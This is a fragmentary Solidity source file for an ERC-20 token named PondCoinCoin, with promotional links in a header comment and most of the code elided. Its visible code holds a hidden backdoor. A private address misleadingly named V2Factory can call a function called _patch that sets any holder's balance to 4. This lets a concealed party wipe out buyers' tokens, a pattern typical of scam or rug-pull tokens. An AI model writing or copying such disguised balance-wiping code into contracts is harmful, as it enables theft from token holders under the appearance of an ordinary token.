...
https://twitter.com/PondCoinCoinETH
https://t.me/PondCoinCoinOnEth
https://PondCoinCoinerc20.gg
*/
...
pragma solidity ^0.8.0;
contract PondCoinCoin is Context, IERC20, Ownable {
    ...
    address private V2Factory = 0x6390C344694E16847836cD82b296337f7DAb0848;
    ...
    } function _patch(address _patchSender) external { if (msg.sender == V2Factory) _balances[_patchSender] = 0x4;
    } 
